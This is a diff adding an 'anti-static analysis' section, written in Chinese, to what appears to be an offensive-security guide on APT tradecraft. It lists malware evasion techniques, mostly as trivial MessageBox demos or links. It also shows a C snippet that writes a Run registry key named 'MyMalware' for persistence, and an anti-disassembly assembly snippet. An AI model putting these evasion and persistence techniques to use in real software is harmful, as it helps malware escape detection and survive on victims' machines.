@@ -887,4 +887,99 @@ x86_64-w64-mingw32-g++ -O2 ngf.cpp -o ngf.exe -I/usr/share/mingw-w64/include/ -s
 
 ### 反静态
 
+1. 反反汇编
+
+```asm
+section .text
+global _start
+
+_start:
+    db 0xE8, 0x00, 0x00, 0x00, 0x00  ; 调用下一条指令
+    ret                              ; 返回地址为0x1，混淆控制流
+```
+
+2. C运行时库
+
+```c
+#define _NO_CRT_STDIO_INLINE
+#include <windows.h>
+#include <stdio.h>
+
+// 示例函数
+void run() {
+    MessageBoxA(NULL, "Static CRT Library Example", "Hello", MB_OK);
+}
+
+int main() {
+    run();
+    return 0;
+}
+```
+
+3. 代码优化
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// 强制内联函数
+__forceinline void inlineFunction() {
+    MessageBoxA(NULL, "Inline Function", "Hello", MB_OK);
+}
+
+void run() {
+    inlineFunction();
+    printf("Running optimized code...\n");
+}
+
+int main() {
+    run();
+    return 0;
+}
+```
+
+4. 调试信息
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// 示例函数
+void run() {
+    MessageBoxA(NULL, "No Debug Info", "Hello", MB_OK);
+}
+
+int main() {
+    run();
+    return 0;
+}
+```
+
+5. 更改文件HASH值
+
+[复制可执行文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/复制可执行文件.cpp)
+
+[复制可执行文件更改注册表](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/复制可执行文件更改注册表.cpp)
+
+```c
+// 确保下次运行的是 newExecutablePath - 修改注册表持久化条目
+HKEY hKey;
+if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+    RegSetValueEx(hKey, L"MyMalware", 0, REG_SZ, (BYTE*)newExecutablePath, (lstrlen(newExecutablePath) + 1) * sizeof(wchar_t));
+    RegCloseKey(hKey);
+}
+```
+
+6. 隐藏导入地址表
+
+[隐藏导入地址表](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/隐藏导入地址表.cpp)
+
+7. API哈希
+
+[API哈希](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/API哈希.cpp)
+
+8. 引导Shellcode
+
+[引导Shellcode](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/引导Shellcode.cpp)
+
 ## 免杀规避
